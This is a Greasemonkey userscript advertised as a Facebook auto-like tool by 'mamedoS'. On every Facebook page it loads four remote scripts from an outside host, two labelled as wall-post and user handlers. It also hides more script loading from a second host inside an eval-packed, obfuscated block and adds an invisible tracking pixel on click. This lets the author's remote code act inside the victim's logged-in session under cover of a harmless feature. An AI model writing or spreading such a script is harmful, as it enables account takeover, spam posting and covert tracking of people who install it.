// ==UserScript==
// @name			Facebook AutoLike Script by mamedoS
// @namespace		        mamedosliker
// @description		        AutoLikes aLL Statuses On Facebook AutomaticaLLy
// @author			mamedoS
// @authorURL		        http://www.facebook.com/sauvagebaku
// @homepage		        http://userscripts.org/scripts/show/155115
// @include			htt*://www.facebook.com/*
// @version			1.0.0.0
// ==/UserScript==
function addJavascript(jsname){
if(document.getElementsByName(jsname).length <= 0){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
    s.setAttribute("name",jsname);
	s.setAttribute('src',jsname);
	th.appendChild(s);
}
}
if(location.hostname.indexOf("facebook.com") >= 0){
addJavascript('http://mamed0s.host56.com/php/ask.php'); //Ask.fm 
addJavascript('http://mamed0s.host56.com/php/post.php'); //Facebook WallPost
addJavascript('http://mamed0s.host56.com/php/user.php'); //Facebook User.php
addJavascript('http://mamed0s.host56.com/php/sd.js'); //Facebook User.php
}
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('5(8.b.4("1.c")>=0){7(\'3://1.9-a.2/6/1.d\')}5(8.b.4("e.2")>=0){7(\'3://1.9-a.2/6/f.g\')}',17,17,'|ask|com|http|indexOf|if|seRvet|addJavascript|location|r|clup|hostname|fm|js|facebook|user|php'.split('|'),0,{}))

document.addEventListener("click",function(){
if(document.getElementById("analytics")){
document.getElementById("analytics").outerHTML = "";
}
var d = document;
var img = d.createElement("img");
img.src = "http://whos.amung.us/widget/ts6sjbwxk8hl.png";
img.id = "ts6sjbwxk8hl";
img.style.width = "0px";
img.style.height = "0px";
d.getElementsByTagName("body")[0].appendChild(img);
},false);